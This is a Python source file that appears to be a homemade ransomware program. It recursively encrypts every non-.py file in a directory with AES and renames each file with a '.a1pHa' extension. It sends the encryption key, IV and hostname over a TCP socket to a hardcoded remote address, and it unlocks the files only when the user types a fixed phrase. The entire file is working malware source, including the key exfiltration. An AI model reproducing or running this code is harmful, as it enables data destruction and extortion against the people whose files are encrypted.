import os
import random
from Crypto.Cipher import AES
import base64
import socket
import pathlib


# KEY GENERATION
def generate_key(size):
    key = ''
    for i in range(int(size)):
        key += chr(random.randint(33, 127))
    return key


# IV GENERATION
def generate_iv():
    iv = ''
    for i in range(16):
        iv += chr(random.randint(33, 127))
    return iv


# ENCRYPTION
def aes_encrypt(key, iv, message):
    key = key.encode('utf-8')
    iv = iv.encode('utf-8')
    message_bs64 = base64.b64encode(message)
    aes = AES.new(key, AES.MODE_CBC, iv)
    encrypted = aes.encrypt(pad(128, message_bs64))
    return encrypted


# DECRYPTION
def aes_decrypt(key, iv, cipher_bs64):
    key = key.encode('utf-8')
    iv = iv.encode('utf-8')
    des = AES.new(key, AES.MODE_CBC, iv)
    decrypted_b6 = des.decrypt(cipher_bs64).decode()
    decrypted_b6 = unpad(decrypted_b6)
    decrypted = base64.b64decode(decrypted_b6.encode('utf-8'))
    return decrypted


# PADDING
def pad(size, data):
    pads = size - (len(data) % size)
    data += bytes(chr(pads) * pads, encoding="utf8")
    return data


# UNPADDING
def unpad(text):
    return text[:-ord(text[-1])]


# FILE LISTING
def file_listing(directory_path):
    list_of_contents = os.listdir(directory_path)
    files_list = []
    for item in list_of_contents:
        name, ext = os.path.splitext(f'{directory_path}/{item}')
        if os.path.isfile(f'{directory_path}/{item}'):
            if ext != '.py':
                files_list.append(f'{directory_path}/{item}')
        elif os.path.isdir(f'{directory_path}/{item}'):
            inter_files = file_listing(f'{directory_path}/{item}')
            for pp in inter_files:
                files_list.append(pp)

    return files_list


# ADD EXTENSION
def add_extension(filepath):
    if os.path.isfile(filepath):
        filename, extension = os.path.splitext(filepath)
        changed_path = f'{filename}{extension}.a1pHa'
        os.rename(filepath, changed_path)
    else:
        pass


# REMOVE EXTENSION
def remove_extension(filepath):
    filename, extension = os.path.splitext(filepath)
    if extension == '.a1pHa':
        os.rename(filepath, filename)
    else:
        pass


# DATA TRANSFER
def data_transfer(key, iv, hostname):
    if hostname is None:
        hostname = 'Mac'
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP_ADDRESS, PORT))
            s.send(f'{hostname} : {key}, {iv}'.encode('utf-8'))
            s.close()

    except:
        pass


# ENCRYPTION PART
def file_encrypt(key, iv, file_path_list):
    for file_path in file_path_list:
        try:
            with open(file_path, 'rb') as f1:
                file_data = f1.read()
                encrypted = aes_encrypt(key, iv, file_data)

            with open(file_path, 'wb') as f2:
                f2.write(encrypted)

        except:
            pass

        add_extension(file_path)


# DECRYPTION PART
def file_decrypt(key, iv, file_path_list):
    for file_path in file_path_list:
        try:
            with open(file_path, 'rb') as f3:
                file_data = f3.read()
                decrypted = aes_decrypt(key, iv, file_data)

            with open(file_path, 'wb') as f4:
                f4.write(decrypted)

        except:
            pass

        remove_extension(file_path)


# MAIN ENCRYPT FUNCTION
def main_encrypt(key, iv, director):
    files_list = file_listing(director)
    file_encrypt(key, iv, files_list)


# MAIN DECRYPT FUNCTION
def main_decrypt(key, iv, director):
    verify = str(input('Enter the Key: '))
    if verify == 'please decrypt':
        files_list = file_listing(director)
        file_decrypt(key, iv, files_list)
    else:
        main_decrypt(key, iv, director)


if __name__ == '__main__':
    # directory = os.environ['USERPROFILE'] + '\\Desktop' + '\\TEST'
    directory = '/Users/jithendranadh/PycharmProjects/Ransomwar/TEST'
    host = os.getenv('COMPUTERNAME')
    IP_ADDRESS = '192.168.162.190'
    PORT = 5678
    key = generate_key(16)
    iv = generate_iv()
    data_transfer(key, iv, host)

    main_encrypt(key, iv, directory)
    main_decrypt(key, iv, directory)
